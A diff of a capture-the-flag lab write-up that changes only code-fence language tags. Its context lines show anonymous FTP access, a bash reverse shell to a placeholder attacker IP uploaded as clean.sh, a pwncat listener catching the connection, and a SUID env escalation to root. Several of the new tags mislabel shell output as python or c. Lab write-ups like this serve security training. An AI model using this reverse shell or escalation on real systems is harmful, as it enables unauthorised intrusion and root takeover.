@@ -213,7 +213,7 @@ So we have 4 ports open 21(FTP) ,22(ssh) ,139 and 445(smb). First, let's check w
 ftp $IP
 ````````
 
-````````
+````````python
 Connected to 10.10.27.113.
 220 NamelessOne's FTP Server!
 Name (10.10.27.113:root): anonymous
@@ -265,7 +265,7 @@ Okay, here we have 3 files let's download all of them and see what they are... t
 bash -i >& /dev/tcp/YOUR_IP/8080 0>&1
 ````````
 
-````````
+````````python
 ftp> put clean.sh 
 local: clean.sh remote: clean.sh
 229 Entering Extended Passive Mode (|||21354|)
@@ -283,7 +283,7 @@ So, we have a shell. let's get our first flag.
 pwncat-cs -lp 8080
 ````````
 
-````````
+````````python
 [02:35:10] Welcome to pwncat 🐈!                                                                                                                              __main__.py:164
 [02:35:23] received connection from 10.10.27.113:57190                                                                                                             bind.py:84
 [02:35:25] 0.0.0.0:8080: normalizing shell path                                                                                                                manager.py:957
@@ -299,11 +299,11 @@ YESS!!! we got user.txt. now let's escalate our privilege and get root.txt...
 
 ## Privilage Esculation
 
-````````
+````````c
 /usr/bin/env /bin/sh -p
 ````````
 
-````````
+````````python
 \[\](remote)\[\] \[\]root@anonymous\[\]:\[\]/tmp\[\]$ whoami
 root
 \[\](remote)\[\] \[\]root@anonymous\[\]:\[\]/tmp\[\]$ cd /root
